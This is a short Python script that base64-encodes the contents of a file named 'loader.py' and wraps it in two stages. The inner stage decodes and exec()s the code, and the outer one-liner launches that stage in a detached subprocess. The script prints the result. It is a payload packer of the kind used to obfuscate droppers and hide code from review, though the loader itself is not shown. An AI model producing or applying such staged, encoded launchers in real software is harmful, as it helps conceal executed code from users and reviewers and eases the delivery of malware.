import base64

def b64e(input) -> str:
	return base64.b64encode(input.encode()).decode()

with open("loader.py") as f:
	script = f.read()

stage2 = f'''import base64;exec(base64.b64decode("{b64e(script)}").decode())'''
stage1 = f"""import subprocess,sys;subprocess.Popen([sys.executable,"-c",'''{stage2}'''])"""

print(stage1)